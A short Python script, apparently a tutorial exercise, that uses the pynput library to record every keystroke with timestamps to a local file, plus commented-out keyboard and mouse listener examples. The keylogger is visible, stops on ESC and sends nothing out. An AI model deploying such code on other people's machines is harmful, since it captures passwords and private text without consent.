from pynput import keyboard
from datetime import datetime

# ---- Step 1: File to store logs ----
log_file = "keys.txt"

# ---- Step 2: Define key press handler ----
def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        print(f"{timestamp} - Key '{key.char}' pressed\n")
        with open(log_file, "a") as f:  # append mode
            f.write(f"{timestamp} - Key '{key.char}' pressed\n")
    except AttributeError:
        print(f"{timestamp} - Special key {key} pressed\n")
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - Special key {key} pressed\n")

# ---- Step 3: Define key release handler ----
def on_release(key):
    if key == keyboard.Key.esc:  # Stop on ESC
        print("🛑 Keylogger stopped.")
        return False

# ---- Step 4: Start listening ----
print("✅ Keylogger started... (Press ESC to stop)")
# with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()

# Create a listener object
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# Start the listener
listener.start()

# Keep the program running
listener.join()





#keyboard
# from pynput import keyboard

# def on_press(key):
#     print(f"Key pressed: {key}")

# def on_release(key):
#     print(f"Key released: {key}")
#     if key == keyboard.Key.esc:
#         return False  # stop listener

# # Create a listener object
# listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# # Start the listener
# listener.start()

# # Keep the program running
# listener.join()



# from pynput import mouse

# def on_click(x, y, button, pressed):
#     if pressed:
#         print(f"Mouse clicked at {(x, y)} with {button}")
#     else:
#         print("Mouse released")

# # Create a listener object
# listener = mouse.Listener(on_click=on_click)

# # Start the listener
# listener.start()

# # Keep the program running
# listener.join()
